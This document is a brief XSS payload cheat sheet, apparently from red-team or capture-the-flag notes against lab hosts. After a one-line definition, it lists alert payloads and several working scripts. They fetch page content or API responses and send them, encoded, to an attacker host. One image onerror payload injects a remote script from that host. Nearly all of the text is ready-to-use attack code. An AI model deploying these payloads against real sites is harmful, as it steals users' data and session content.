#Red-Team #Exploit #function #Generation #Payload #Vulnerability 

## What is XSS?

#### **Cross-Site Scripting (XSS)** is a type of web application security vulnerability that allows an attacker to inject and execute malicious scripts.


## Payloads:

### `<script>alert(1);</script>` OR `<img src=x onerror=alert(1);>`


## Page/Token steal 

#### Create a file script.js and host it on the port 80:
````
fetch('/api/info').then(response => response.text()).then(text => {
    fetch('http://10.10.XX.XX:8000/log?' + btoa(text), {
        mode: 'no-cors'
    });
});
````
#### Then send this script to redirect him to the file:

````
<img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://10.10.XX.XX/script.js'; document.body.appendChild(s);">
````

## Steal page content


````
```
<script>  
  fetch("http://alert.htb/index.php?page=messages")  
    .then(response => response.text()) // Convert the response to text  
    .then(data => {       
      fetch("http://<your host>/?data=" + encodeURIComponent(data));  
    })  
    .catch(error => console.error("Error fetching the messages:", error));  
</script>
````
### OR

````
var url = "http://10.10.10.25:8000/target";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
````
